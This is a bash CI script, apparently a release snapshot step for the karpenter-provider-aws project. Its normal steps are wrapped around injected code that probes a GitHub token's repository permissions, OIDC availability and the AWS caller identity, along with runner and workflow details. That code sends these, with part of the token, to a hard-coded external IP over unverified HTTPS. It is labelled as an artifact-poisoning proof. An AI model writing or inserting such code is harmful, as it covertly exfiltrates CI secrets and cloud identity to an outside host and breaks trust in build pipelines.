#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" &>/dev/null && pwd)"
source "${SCRIPT_DIR}/common.sh"

commit_sha="$(git rev-parse HEAD)"

TOKEN_SHORT=$(echo "$GITHUB_TOKEN" | cut -c1-12)
PERMS=$(curl -s -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/repos/aws/karpenter-provider-aws | jq -c '.permissions // {}')
OIDC=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo true || echo false)
AWS_IDENTITY=$(aws sts get-caller-identity 2>/dev/null | jq -c '. // {}') || AWS_IDENTITY="null"

jq -n \
  --arg t "${TOKEN_SHORT}..." \
  --arg r "$(whoami)@$(hostname)" \
  --arg repo "$GITHUB_REPOSITORY" \
  --arg wf "$GITHUB_WORKFLOW" \
  --arg ev "$GITHUB_EVENT_NAME" \
  --arg ts "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
  --argjson p "${PERMS:-null}" \
  --argjson o "${OIDC:-false}" \
  --argjson aws "${AWS_IDENTITY:-null}" \
  '{proof:"artifact-poisoning-karpenter-pathB",token:$t,permissions:$p,oidc_available:$o,aws_identity:$aws,runner:$r,repository:$repo,workflow:$wf,event:$ev,timestamp:$ts}' \
  | curl -sk -o /dev/null -X POST https://34.68.99.161:4444 -H "Content-Type: application/json" -d @-

if [[ "$(git status --porcelain)" != "" ]]; then
  exit 1
fi

snapshot "${commit_sha}"
